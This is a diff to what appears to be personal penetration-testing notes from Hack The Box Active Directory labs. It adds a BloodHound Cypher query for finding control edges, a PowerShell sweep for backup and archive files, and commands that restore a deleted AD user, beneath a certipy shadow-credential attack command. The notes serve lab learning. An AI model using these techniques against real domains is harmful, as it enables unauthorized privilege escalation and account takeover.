@@ -1221,3 +1221,48 @@ Now `certipy` will do the shadow credential attack:
 oxdf@hacky$ certipy shadow auto -target dc01.tombwatcher.htb -u sam -p '0xdf0xdf!' -account john
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 ```
+
+***
+
+## <mark style="color:red;">Check for any outbound control is with Cypher queries</mark>
+
+```
+MATCH p=(source)-[r]->(target)
+WHERE (source:Computer OR source:User) 
+AND type(r) <> 'MemberOf'
+RETURN p
+```
+
+***
+
+## Windows File discovery search
+
+```
+gci C:\ -Include *.zip, *.bak, *.7z -File -Recurse -Force -ErrorAction SilentlyContinue
+gci C:\ -Include *.zip, *.bak, *.7z -File -Recurse -Force -ErrorAction SilentlyContinue
+```
+
+***
+
+## RECOVER DISABLED USER&#x20;
+
+```
+PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+
+
+Deleted           : True
+DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
+Name              : Todd Wolfe
+                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+ObjectClass       : user
+ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
+objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
+```
+
+todd.wolfe is there, matching up with what was in the Excel workbook. I’ll recover it:
+
+```
+PS C:\> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
+```
